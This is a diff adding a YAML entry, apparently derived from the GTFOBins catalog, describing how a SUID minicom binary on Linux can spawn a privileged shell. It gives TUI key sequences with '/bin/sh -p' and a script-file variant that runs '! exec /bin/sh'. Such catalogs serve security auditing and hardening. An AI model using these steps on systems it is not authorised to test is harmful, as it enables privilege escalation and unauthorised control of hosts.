@@ -1,0 +1,149 @@
+id: gtfobins/minicom/shell/suid
+type: binary
+platform: linux
+name: minicom
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: minicom -D /dev/null
+  comment: 'Start the following command to open the TUI interface, then:
+
+
+    1. press `Ctrl-A o` and select `Filenames and paths`;
+
+    2. press `e`, type `/bin/sh`, then `Enter`;
+
+    3. Press `Esc` twice;
+
+    4. Press `Ctrl-A k` to drop the shell.
+
+
+    After the shell, exit with `Ctrl-A x`.
+
+
+    Start the following command to open the TUI interface, then:
+
+
+    1. press `Ctrl-A o` and select `Filenames and paths`;
+
+    2. press `e`, type `/bin/sh -p`, then `Enter`;
+
+    3. Press `Esc` twice;
+
+    4. Press `Ctrl-A k` to drop the shell.
+
+
+    After the shell, exit with `Ctrl-A x`.'
+- template: 'echo ''! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty'' >/path/to/temp-file
+
+    minicom -D /dev/null -S /path/to/temp-file
+
+    reset^J'
+  comment: After the shell, exit with `Ctrl-A x`.
+references:
+- https://gtfobins.github.io/gtfobins/minicom/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        minicom:
+          comment: Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.
+          functions:
+            shell:
+            - code: minicom -D /dev/null
+              comment: 'Start the following command to open the TUI interface, then:
+
+
+                1. press `Ctrl-A o` and select `Filenames and paths`;
+
+                2. press `e`, type `/bin/sh`, then `Enter`;
+
+                3. Press `Esc` twice;
+
+                4. Press `Ctrl-A k` to drop the shell.
+
+
+                After the shell, exit with `Ctrl-A x`.'
+              contexts:
+                sudo: null
+                suid:
+                  comment: 'Start the following command to open the TUI interface, then:
+
+
+                    1. press `Ctrl-A o` and select `Filenames and paths`;
+
+                    2. press `e`, type `/bin/sh -p`, then `Enter`;
+
+                    3. Press `Esc` twice;
+
+                    4. Press `Ctrl-A k` to drop the shell.
+
+
+                    After the shell, exit with `Ctrl-A x`.'
+                unprivileged: null
+            - code: 'echo ''! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty'' >/path/to/temp-file
+
+                minicom -D /dev/null -S /path/to/temp-file
+
+                reset^J'
+              comment: After the shell, exit with `Ctrl-A x`.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/minicom/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:78d4f88ca827673f2ae4aefd6f56824da105721ac38e6eaf5933f6b107188afb
